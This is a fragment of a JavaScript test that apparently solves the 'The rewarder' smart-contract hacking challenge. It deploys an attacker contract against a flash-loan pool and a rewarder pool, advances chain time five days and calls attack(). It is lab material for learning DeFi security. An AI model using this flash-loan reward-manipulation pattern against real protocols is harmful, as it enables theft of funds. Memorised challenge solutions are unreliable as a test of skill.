...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        const MainRewarderAttackerFactory = await ethers.getContractFactory('MainRewarderAttacker', deployer);
        const mainRewarderAttacker = await MainRewarderAttackerFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address, attacker.address)

        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]) // 5 days
        await mainRewarderAttacker.attack()
    });
